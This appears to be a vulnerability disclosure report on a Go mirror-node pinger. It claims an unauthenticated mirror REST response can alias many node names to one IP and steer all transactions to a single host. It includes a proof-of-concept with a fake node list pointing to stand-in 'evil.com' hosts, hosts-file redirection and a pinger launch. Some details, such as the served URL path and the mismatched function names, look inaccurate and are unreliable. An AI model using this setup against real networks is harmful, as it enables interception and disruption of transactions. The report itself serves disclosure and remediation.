### Title
Unauthenticated Mirror REST Response Enables Full Traffic Concentration via DNS Aliasing in `buildNetworkFromMirrorNodes()`

### Summary
`fetchMirrorNodeNetwork()` in `pinger/mirror_node_client.go` builds the SDK node map by keying entries on the raw domain-name string from the mirror REST response, without any validation of those names or resolution of their IPs. An attacker who can control the mirror REST response (via MITM on an HTTP endpoint or DNS hijacking of the mirror REST hostname) can serve a `nodesEnvelope` containing many node entries with distinct domain names that all resolve to a single IP, causing the Hiero SDK to distribute all pinger transactions to that one physical host while every other consensus node receives zero traffic.

### Finding Description
**Code path:** `pinger/mirror_node_client.go`, `fetchMirrorNodeNetwork()`, lines 100–124.

```go
network := make(map[string]hiero.AccountID)
for _, n := range payload.Nodes {
    ...
    for _, ep := range n.ServiceEndpoints {
        host := strings.TrimSpace(ep.DomainName)   // taken verbatim from JSON
        if host == "" { host = strings.TrimSpace(ep.IPAddressV4) }
        if host == "" || ep.Port == 0 { continue }
        addr := net.JoinHostPort(host, fmt.Sprintf("%d", ep.Port))
        network[addr] = nodeAccountId              // key = raw string, not resolved IP
    }
}
```

The map key is the **raw domain-name string**, not the resolved IP address. The only guards are:
- `NodeAccountID` must be non-empty and parse as a valid `AccountID` (format check only, no cross-validation against a known node set).
- `host` and `port` must be non-empty/non-zero.

There is no:
- Validation that domain names match expected Hedera node patterns.
- Resolution and deduplication of IPs before building the map.
- Signature or integrity check on the mirror REST payload.
- TLS certificate pinning for the mirror REST HTTP client (`&http.Client{Timeout: ...}` — plain HTTP is accepted if `cfg.mirrorRest` is an `http://` URL).

**Exploit flow:**
1. Attacker crafts a `nodesEnvelope` with N node entries (e.g., 20), each with a syntactically valid but distinct `NodeAccountID` (e.g., `0.0.3` through `0.0.22`) and a `serviceEndpoints` list containing a unique domain name per entry (`node1.evil.com:50211`, `node2.evil.com:50211`, …, `node20.evil.com:50211`).
2. All those domain names are configured in attacker-controlled DNS to return the same A record (e.g., `1.2.3.4` — one real or attacker-owned node).
3. The resulting `network` map has 20 distinct string keys, all mapping to different `AccountID` values, but at connection time every gRPC dial resolves to `1.2.3.4`.
4. The Hiero SDK round-robins transactions across all 20 map entries; every transaction lands on `1.2.3.4`.
5. The remaining ≥30% of real consensus nodes receive zero pinger traffic.

**How the attacker controls the mirror REST endpoint (unprivileged path):**
- If `HIERO_MIRROR_PINGER_REST` is an `http://` URL, any on-path network actor can inject a response (no TLS).
- If it is `https://` but the mirror REST hostname has no DNSSEC, DNS cache poisoning redirects the pinger to an attacker server that presents a valid certificate for a different hostname — Go's `http.Client` will reject it *unless* the attacker also has a valid cert, but a self-signed CA injected via the container's trust store (a realistic supply-chain step) bypasses this.
- In Kubernetes deployments the `mirrorRest` value is often a cluster-internal service name over plain HTTP, making MITM trivial for any pod in the same namespace.

### Impact Explanation
All pinger-originated transactions are funneled to one physical node. The remaining nodes (potentially ≥30% of the network) receive no synthetic load from the pinger, which defeats the monitoring purpose and can trigger false "healthy" readings for the targeted node while masking failures on all others. If the targeted node is the attacker's own infrastructure, the attacker also receives every signed transaction the pinger submits (including operator key usage patterns). Classified as Medium per the scope definition: ≥30% of processing nodes lose monitoring coverage without brute force.

### Likelihood Explanation
- The `network=other` mode is explicitly designed for private/custom deployments where the mirror REST URL is often HTTP inside a cluster — the most common deployment pattern for this code path.
- DNS hijacking of an internal cluster service name requires only pod-level access in the same namespace, which is achievable by any workload without cluster-admin privileges.
- The attack is repeatable: the pinger calls `buildNetworkFromMirrorNodes()` once at startup; a single poisoned response persists for the lifetime of the process.
- No cryptographic material or privileged OS access is required.

### Recommendation
1. **Resolve and deduplicate IPs before keying the map.** After collecting `host:port` pairs, resolve each hostname to its IP(s) and use `ip:port` as the map key. Entries that resolve to the same IP should be collapsed to one.
2. **Enforce HTTPS with certificate validation** for the mirror REST URL; reject `http://` schemes at config load time.
3. **Cross-validate returned `NodeAccountID` values** against a compile-time or operator-supplied allowlist of known node account IDs; reject any entry not on the list.
4. **Enforce a minimum distinct-IP count** (e.g., ≥ 3) before accepting the network map; abort startup if the resolved IPs collapse to fewer than the expected node count.
5. **Pin the mirror REST TLS certificate or CA** via an operator-supplied PEM, preventing MITM even if DNS is poisoned.

### Proof of Concept
```
# 1. Stand up a fake mirror REST server
cat > nodes.json <<'EOF'
{"nodes":[
  {"node_account_id":"0.0.3","service_endpoints":[{"domain_name":"node3.evil.com","port":50211}]},
  {"node_account_id":"0.0.4","service_endpoints":[{"domain_name":"node4.evil.com","port":50211}]},
  {"node_account_id":"0.0.5","service_endpoints":[{"domain_name":"node5.evil.com","port":50211}]},
  ... (repeat for all real node IDs)
],"links":{"next":null}}
EOF
python3 -m http.server 8080   # serves nodes.json at /api/v1/network/nodes

# 2. Point all evil DNS names to one real node IP (e.g., 35.237.200.180)
# In /etc/hosts or attacker-controlled DNS:
# 35.237.200.180  node3.evil.com node4.evil.com node5.evil.com ...

# 3. Launch pinger against the fake mirror REST
HIERO_MIRROR_PINGER_NETWORK=other \
HIERO_MIRROR_PINGER_REST=http://localhost:8080 \
HIERO_MIRROR_PINGER_OPERATOR_ID=0.0.2 \
HIERO_MIRROR_PINGER_OPERATOR_KEY=<key> \
./pinger

# Result: all SDK transactions are sent to 35.237.200.180 regardless of
# which AccountID the SDK selects, because every map entry resolves there.
# tcpdump on any other real node shows zero pinger gRPC traffic.
```
